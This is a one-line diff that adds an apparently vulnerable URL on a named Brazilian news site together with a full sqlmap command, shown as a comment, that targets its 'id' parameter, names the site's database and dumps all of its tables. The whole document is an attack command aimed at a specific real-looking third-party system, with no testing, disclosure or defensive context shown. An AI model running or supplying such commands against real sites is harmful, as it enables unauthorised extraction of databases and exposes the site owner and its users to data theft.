@@ -1,0 +1,1 @@
+http://www.evolute.net.br/noticia.php?id=37 (GET)  # sqlmap.py -u http://www.evolute.net.br/noticia.php?id=37 -D evolute_BD --tables --dump-all --threads 5 -v3
